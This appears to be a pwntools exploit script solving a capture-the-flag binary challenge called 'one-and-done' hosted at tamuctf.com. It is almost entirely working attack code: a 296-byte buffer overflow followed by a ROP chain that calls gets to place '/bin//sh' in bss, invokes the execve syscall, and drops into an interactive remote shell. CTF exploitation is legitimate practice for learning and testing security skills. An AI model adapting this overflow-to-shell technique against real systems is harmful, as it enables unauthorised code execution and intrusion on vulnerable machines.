#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

exe = ELF('./one-and-done')
#p = exe.process()
raw_input("DEBUG")
host, port = "206.189.113.236", "30674"

p = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")

pop_rdi = 0x0000000000401793 # pop rdi ; ret
pop_rsi = 0x0000000000401713 # pop rsi ; ret
pop_rdx = 0x0000000000401f31 # pop rdx ; ret
pop_rax = 0x000000000040100b # pop rax ; ret
syscall = 0x0000000000401ab2 # syscall; ret;
ret = 0x000000000040100c # ret

bss =0x0000000000405320
payload = b"A"*296
payload += p64(pop_rdi)+p64(bss)+p64(exe.sym['gets'])+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall)
payload += p64(pop_rax)+p64(60)+p64(syscall)


p.sendlineafter('pls\n',payload)

p.sendline('/bin//sh')

p.interactive()
